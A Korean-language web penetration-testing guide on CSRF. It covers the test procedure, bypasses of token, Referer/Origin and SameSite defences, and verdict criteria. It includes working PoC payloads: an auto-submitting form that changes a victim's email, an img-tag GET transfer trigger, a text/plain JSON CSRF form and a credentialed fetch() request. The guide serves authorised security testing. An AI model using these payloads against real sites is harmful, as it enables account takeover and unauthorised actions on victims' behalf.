---
sidebar_position: 20
title: CSRF
description: 웹 진단 - CSRF 점검 절차, 토큰/Referer/Origin 검증 우회, GET 변경, SameSite, 판정 기준
keywords: [CSRF, XSRF, Cross-Site Request Forgery, SameSite, Anti-CSRF Token, Synchronizer Token, OWASP A01]
draft: false
---

# 크로스 사이트 요청 위조
> 인증된 사용자가 공격자 사이트 방문 시, 자신의 의도와 무관하게 대상 사이트로 **변경 요청** (이체·비밀번호 변경·권한 부여 등) 이 자동 전송되는 취약점.
> 관리자 대상 + 임팩트 큰 액션이면 단일 결함만으로 시스템 전체 침해까지 가능.

## 점검 개요

| 항목 | 내용 |
| :--- | :--- |
| **분류** | OWASP A01:2025 - Broken Access Control (CSRF는 권한 검증 카테고리에 포함, 별도 항목 아님) / KISA 권한 관리 |
| **CWE** | [CWE-352: Cross-Site Request Forgery](https://cwe.mitre.org/data/definitions/352.html) |
| **영향도** | 🔴 (관리자 대상 + 임팩트 큰 액션) / 🟡 (일반 사용자 + 사소한 액션) |
| **점검 난이도** | 하 (PoC HTML 작성 자체는 단순) |
| **예상 점검 시간** | 30분 ~ 2시간 (변경 액션 수에 비례) |

---

## 점검 목적

상태를 변경하는 모든 요청 (POST/PUT/DELETE/PATCH, 그리고 잘못 설계된 GET) 이 **공격자가 유도한 크로스사이트 요청** 으로 트리거되지 않도록 보호되어 있는지 확인한다. Anti-CSRF 토큰·SameSite 쿠키·Origin/Referer 검증 중 어떤 메커니즘이 적용되어 있고, 우회 가능한지 점검.

> 세션 쿠키 기반 인증 페이지가 주 대상. `Authorization: Bearer ...` 헤더만 사용하고 쿠키 세션을 안 쓰는 SPA/모바일 백엔드는 CSRF 영향이 본질적으로 없음.

---

## 유형 구분

| 유형 | 핵심 |
| :--- | :--- |
| **CSRF 토큰 미적용** | Anti-CSRF 토큰 자체가 없음 |
| **CSRF 토큰 검증 미흡** | 값 존재 여부만 체크 / 빈 값 통과 / 다른 사용자 토큰 통과 |
| **Referer/Origin 검증 미흡** | Referer 빈 값 통과 / 부분 매칭 우회 |
| **GET 으로 상태 변경** | 변경 액션이 GET 으로 처리됨 — `<img src>` 한 줄로 트리거 |
| **SameSite 쿠키 미설정** | `SameSite=None` 또는 미설정 → 크로스사이트 자동 전송 |
| **JSON CSRF (한정)** | Content-Type 우회 가능한 경우 |

---

## 진단 절차

### Step 1. 변경 액션 매핑

Burp 시퀀스에서 다음을 모두 수집:

- POST / PUT / DELETE / PATCH 요청 전체
- **상태 변경하는 GET 요청** — 있으면 안 되지만 체크 (예: `/api/account/delete?id=42`)
- 인증 쿠키가 자동 전송되는 모든 변경 액션

### Step 2. CSRF 방어 메커니즘 식별

각 요청에서 다음 확인:

- **Anti-CSRF 토큰** — body / 헤더 (`X-CSRF-Token`, `X-XSRF-TOKEN`) / 별도 쿠키
- **Referer / Origin 헤더 검증** — 헤더 변조 시 응답 변화
- **SameSite 쿠키 속성** — 세션 쿠키의 `Set-Cookie` 헤더 (세션 관리 페이지 참조)

### Step 3. 우회 시도

토큰 제거/변조, Referer 제거/변조, GET 변환, JSON Content-Type 우회 (케이스 1~6).

### Step 4. 다른 origin 트리거 확인

다른 origin (`http://attacker.com/poc.html`) 에서 호스팅된 HTML 이 자동으로 변경 요청을 트리거하는지 실제 브라우저로 확인. Burp Repeater에서 쿠키를 붙여 보낸 요청이 성공하는 것만으로는 CSRF 입증이 아니다.

---

## 페이로드 / 테스트 케이스

### 케이스 1: CSRF 토큰 미적용 — 단순 PoC HTML

**언제 쓰는지**: Step 2에서 어떤 CSRF 방어도 식별되지 않을 때. 가장 단순하고 가장 자주 발견되는 케이스.

**PoC HTML (다른 도메인에서 호스팅):**

```html
<!DOCTYPE html>
<html>
<body>
  <form id="csrf" action="https://<TARGET>/api/profile/email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
  </form>
  <script>document.getElementById('csrf').submit();</script>
</body>
</html>
```

**판정**: 다른 도메인(`http://attacker.com/poc.html`) 에서 페이지를 열었을 때 피해자(로그인 상태) 의 이메일이 `attacker@evil.com` 으로 변경되면 취약. 변경 후 이메일 인증 흐름이 없으면 영향도 더 큼.

### 케이스 2: 토큰 제거 / 빈 값 / 다른 사용자 토큰 우회

**언제 쓰는지**: CSRF 토큰이 있는 것처럼 보이지만, 검증이 미흡할 가능성을 확인할 때.

**시도 단계:**

```
1. 정상 요청: csrf_token=ABC123XYZ      → 200 OK

2. 토큰 파라미터 자체 제거 (필드 삭제) → 200 이면 취약
3. 토큰 빈 값: csrf_token=             → 200 이면 취약
4. 토큰 변조: csrf_token=AAAAAA        → 200 이면 취약 (값 검증 자체 안 함)
5. 다른 사용자(B) 의 토큰 사용:
   A 의 세션 쿠키 + B 의 토큰          → 200 이면 사용자별 검증 누락 (취약)
```

**판정**: 위 시도 중 하나라도 200 응답이면 토큰 검증 미흡. 특히 5번(다른 사용자 토큰 통과) 은 자주 발견되며, **토큰을 발급하지만 사용자 매칭은 안 함** 패턴.

### 케이스 3: Referer / Origin 검증 미흡

**언제 쓰는지**: CSRF 토큰 없이 Referer/Origin 만으로 방어하는 경우. 모던 환경에서는 Origin 검증이 표준.

**시도 단계:**

```
1. 정상 요청 (Referer: https://<TARGET>/profile)  → 200

2. Referer 헤더 자체 제거                 → 200 이면 취약
   (Referer 가 없을 때를 안전하게 본다는 잘못된 가정)

3. Referer 변조:
   Referer: https://attacker.com/<TARGET>/profile   ← 부분 매칭 우회
   Referer: https://<TARGET>.attacker.com/          ← 서브도메인 트릭
   → 통과 시 contains() 기반 검증 = 취약

4. Origin 검증만 있고 null Origin 통과:
   <iframe sandbox> 에서 발생하는 요청은 Origin: null
   서버가 null 을 화이트리스트로 처리하면 우회 가능
```

**판정**: 위 변형 중 하나로 정상 응답이 나오면 검증 우회 가능 = 취약.

### 케이스 4: GET 으로 상태 변경
**언제 쓰는지**: 변경 액션이 GET 으로 처리되는 경우. 옛날 시스템이나 잘못된 RESTful 설계에서 발견.

**예시 요청:**

```
GET /api/account/transfer?to=attacker&amount=1000000 HTTP/1.1
GET /admin/users/42/delete HTTP/1.1
GET /logout HTTP/1.1
```

**PoC — `<img>` 한 줄로 트리거:**

```html
<img src="https://<TARGET>/api/account/transfer?to=attacker&amount=1000000">
```

**판정**: 사용자가 공격자 페이지에 접속만 해도 (또는 위 페이로드가 들어간 게시글/이메일을 보기만 해도) 자동 실행. SameSite=Lax 환경에서도 GET 은 자동 전송되므로 SameSite 가 있어도 보호 안 됨.

> 단순 logout CSRF 도 있지만 영향도가 낮으므로 우선순위는 이체/권한 변경 같은 임팩트 큰 액션부터.

### 케이스 5: SameSite 쿠키 미설정 + 표준 POST CSRF

**언제 쓰는지**: 세션 관리 페이지에서 인증 쿠키의 SameSite 속성이 누락되었거나 `None` 인 경우.

**전제:**

```
Set-Cookie: SESSION=...; HttpOnly; Secure       ← SameSite 누락
Set-Cookie: SESSION=...; HttpOnly; SameSite=None  ← 명시적 None
```

**시나리오**: 케이스 1~4의 PoC 가 동일하게 동작. 모던 브라우저(Chrome 80+) 는 SameSite 미설정 시 `Lax` 를 기본값으로 적용하지만, 명시적으로 `None` 으로 설정된 경우 또는 옛날 환경에서는 여전히 POST CSRF 가능.

**판정**: SameSite 미흡 자체는 세션 페이지에서 보고. CSRF 페이지에서는 그 결함과 결합된 POST CSRF 가능성을 함께 보고.

### 케이스 6: JSON CSRF
**언제 쓰는지**: 백엔드 API 가 `Content-Type: application/json` 만 받으면 표준 CSRF 가 어려움. 단, **백엔드가 다른 Content-Type 도 받아주는 경우** 우회 가능.

**시나리오 6-1 — `text/plain` 으로 JSON 본문 전송:**

```html
<form action="https://<TARGET>/api/profile" method="POST" enctype="text/plain">
  <input name='{"email":"attacker@evil.com","ignore":"' value='dummy"}'>
</form>
<script>document.forms[0].submit();</script>
```

→ 실제 전송되는 본문: `{"email":"attacker@evil.com","ignore":"=dummy"}`

**시나리오 6-2 — `application/x-www-form-urlencoded` 로 보내도 백엔드가 JSON 파싱:**

일부 백엔드는 본문이 `{`로 시작하면 Content-Type 무시하고 JSON 으로 파싱. 이 경우 표준 form CSRF 가 그대로 통함.

**판정**: 위 변형 중 하나로 변경이 적용되면 취약. 모던 백엔드(Spring `@RequestBody`, Express `express.json()`) 는 Content-Type 검증이 엄격하므로 거의 안 통하지만, 점검 항목으로는 시도.

### 케이스 7: `fetch()` 기반 PUT/DELETE 검증 시 주의

**언제 쓰는지**: 변경 액션이 `PUT /api/member/update`, `DELETE /api/member/withdraw` 처럼 폼으로 직접 보내기 어려운 메서드일 때.

```html
<script>
fetch('https://<TARGET>/api/member/update', {
  method: 'PUT',
  headers: {'Content-Type': 'application/json'},
  credentials: 'include',
  body: JSON.stringify({
    email: 'attacker@evil.com',
    phone: '010-0000-0000'
  })
});
</script>
```

이 형태는 브라우저가 CORS preflight(`OPTIONS`)를 먼저 보내므로, 서버가 공격자 origin을 허용하지 않으면 실제 `PUT` 요청이 전송되지 않는다. `DELETE` 역시 simple method가 아니므로 동일하게 preflight 대상이다.

**판정:** 공격자 origin에서 실제 브라우저로 열었을 때 preflight가 통과하고, 피해자 세션 쿠키가 포함된 본 요청이 전송되어 상태 변경까지 완료되면 CSRF. preflight에서 막히면 해당 `fetch()` 경로의 CSRF는 불발이며, 표준 form 전송이 가능한 `POST`, GET 변경, method override, Content-Type 우회 가능성을 별도로 본다.

### 그 외 — 짧게 언급만
- **Login CSRF** — 공격자 계정으로 피해자가 로그인되도록 유도하는 변형. 가끔 발견되지만 영향도 낮음
- **CSRF + XSS 결합으로 토큰 추출** — XSS 가 있으면 그 자체가 더 큰 문제. 별도 다루지 않음
- **CORS 잘못 설정 + CSRF 결합** — `cors.md`(Priority 2) 로 분리

---

## 취약 판정 기준

다음 중 **하나라도** 해당하면 취약:

- [ ] 변경 액션에 **CSRF 토큰 / Referer / Origin 검증이 모두 없음**
- [ ] CSRF 토큰이 있지만 **빈 값 / 변조 값 / 다른 사용자 토큰** 으로 통과
- [ ] Referer 헤더 **제거 / 부분 매칭 우회** 로 통과
- [ ] **변경 액션이 GET** 으로 처리됨
- [ ] 세션 쿠키 **SameSite 미설정 / `None` 설정** + 표준 CSRF 가능
- [ ] JSON CSRF (Content-Type 우회) 로 변경 적용

**오탐 주의:**

- [ ] 인증 불필요한 공개 API 는 CSRF 대상 아님
- [ ] `Authorization: Bearer ...` 헤더만 사용하고 쿠키 세션 안 쓰는 API 는 CSRF 영향 없음 (브라우저가 헤더를 자동 추가하지 않음)
- [ ] 조회 요청은 CSRF 보호 불필요 (단, 케이스 4의 GET 변경은 별개)
- [ ] Repeater에서 쿠키를 직접 붙여 PUT/DELETE가 성공한 것만으로는 CSRF 아님 — 다른 origin 브라우저 실행과 preflight 통과 여부까지 확인

---

## 참고자료

- [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [PortSwigger - Cross-site request forgery (CSRF)](https://portswigger.net/web-security/csrf)
- [PortSwigger - Bypassing CSRF token validation](https://portswigger.net/web-security/csrf/bypassing-token-validation)
- [PortSwigger - Bypassing SameSite cookie restrictions](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions)
- [OWASP Testing Guide - CSRF](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery)
- [MDN - SameSite cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite)
